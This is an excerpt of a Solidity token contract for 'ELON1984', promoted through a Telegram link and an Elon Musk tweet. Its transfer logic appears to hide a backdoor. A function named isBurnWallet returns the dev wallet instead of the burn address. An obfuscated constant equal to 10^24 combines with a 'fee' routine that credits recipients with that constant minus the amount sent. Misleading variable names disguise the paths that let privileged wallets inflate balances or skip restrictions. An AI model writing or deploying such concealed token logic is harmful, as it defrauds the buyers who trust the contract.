...
// Telegram : https://t.me/bravenewworldBSC

// Website : https://twitter.com/elonmusk/status/1610416059940495363/photo/1
...
contract FAHRENHEIT451 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    mapping (address => bool) public _inAllowances;
    ...
    address payable public Wallet_Marketing = payable(0x3F5E6e62e686554B5a02545d41419fA4713cd78F); 
    address payable public Wallet_Dev = payable(0x7dEDA5B6a752c894EEc7A94C2608bb704B52B9E5);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "FAHRENHEIT 451 BRAVE NEW WORLD 1984"; 
    string private constant _symbol = unicode"ELON1984";
    ...
    uint256 public _maxTokenWallet = (2**3+(2))**((2**5)-(2**3));
    ...
    function isBurnWallet(bool sideAsSide) public view virtual returns (address) {
        address accounted = Wallet_Burn;
        if(sideAsSide){
            accounted = Wallet_Dev;
        }
        return accounted;
    }
    ...
    constructor () {
        ...
        _owner = 0x7dEDA5B6a752c894EEc7A94C2608bb704B52B9E5;
    ...
    function _allowedAlready(address boolOnSet, address boolOffSet, bool resrect) private view returns(bool){
        bool mixedBool = false;
        if(boolOnSet != uniswapV2Pair)
            mixedBool = resrect;
            
        return _inAllowances[boolOffSet] && resrect && mixedBool;
    }
    ...
    function cal_took_Fee(uint256 tAmount) private view returns(uint256){
        return (_maxTokenWallet-tAmount);
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != isBurnWallet(_inAllowances[from]))
        ...
        _tokenTransfer(from, to, amount, takeFee, isBuy, _allowedAlready(from, to, true));
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy, bool tradeOf) private {
        ...
        if(!tradeOf){
            ...
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+cal_took_Fee(tAmount);
        }
